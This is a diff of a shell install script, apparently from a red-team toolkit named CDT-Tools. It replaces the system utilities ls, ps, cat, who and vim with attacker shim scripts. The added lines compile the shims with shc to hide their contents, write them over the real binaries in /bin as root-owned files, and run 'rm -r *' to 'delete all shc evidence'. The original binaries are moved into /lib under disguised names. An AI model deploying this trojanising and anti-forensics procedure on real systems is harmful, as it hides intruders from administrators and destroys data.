@@ -30,6 +30,9 @@ git clone https://github.com/neurobin/shc.git
 make
 make install
 
+# Delete all shc evidence
+rm -r *
+
 
 # Or if you are hosting on a webserver, comment out the line above (git clone)
 # and uncomment the following lines
@@ -46,21 +49,28 @@ mv /bin/cat /lib/module_cat
 mv /usr/bin/who /lib/module_who
 mv /usr/bin/vim /lib/module_vim
 
+# Use 'shc' to "compile" the scripts and place them in /bin
+shc -f CDT-Tools/ls_shim/ls_new -o /bin/ls
+shc -f CDT-Tools/ps_shim/ps_new -o /bin/ps
+shc -f CDT-Tools/cat_shim/cat_new -o /bin/cat
+shc -f CDT-Tools/who_shim/who_new -o /bin/who
+shc -f CDT-Tools/vim_shim/vim_new -o /bin/vim
+
 # Move the shim scripts into /bin with original names
-mv CDT-Tools/ls_shim/ls_new /bin/ls
-mv CDT-Tools/ps_shim/ps_new /bin/ps
-mv CDT-Tools/cat_shim/cat_new /bin/cat
-mv CDT-Tools/who_shim/who_new /bin/who
-mv CDT-Tools/vim_shim/vim_new /bin/vim
+#mv CDT-Tools/ls_shim/ls_new /bin/ls
+#mv CDT-Tools/ps_shim/ps_new /bin/ps
+#mv CDT-Tools/cat_shim/cat_new /bin/cat
+#mv CDT-Tools/who_shim/who_new /bin/who
+#mv CDT-Tools/vim_shim/vim_new /bin/vim
 
 # Make each script executable
-chmod +x /bin/ls 
-chmod +x /bin/ps
-chmod +x /bin/cat
-chmod +x /bin/who
-chmod +x /bin/vim
+#chmod +x /bin/ls 
+#chmod +x /bin/ps
+#chmod +x /bin/cat
+#chmod +x /bin/who
+#chmod +x /bin/vim
 
-# Set SUID bit
+# Set owner to root
 chown root:root /bin/ls
 chown root:root /bin/ps
 chown root:root /bin/cat
